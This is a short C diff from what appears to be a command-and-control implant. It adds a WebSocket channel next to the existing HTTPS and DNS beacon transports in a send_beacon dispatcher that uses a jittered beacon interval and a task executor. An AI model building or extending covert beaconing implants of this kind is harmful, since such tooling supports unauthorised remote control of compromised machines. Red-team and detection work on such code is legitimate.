@@ -19,6 +19,7 @@
 #include "protocols/https.c"
 #include "protocols/dns.c"
 #include "executor/executor.c"
+#include "protocols/websocket.c"
 
 #define INTERVAL     60
 #define MAX_JITTER   30
@@ -37,6 +38,9 @@ static void send_beacon(uint8_t *signed_beacon, size_t signed_len, uint8_t proto
             break;
         case 1:
             dns_send_beacon(signed_beacon, signed_len, task_buf, task_len);
+            break;
+        case 2:
+            ws_send_beacon(signed_beacon, signed_len, task_buf,task_len);
             break;
         default:
             break;
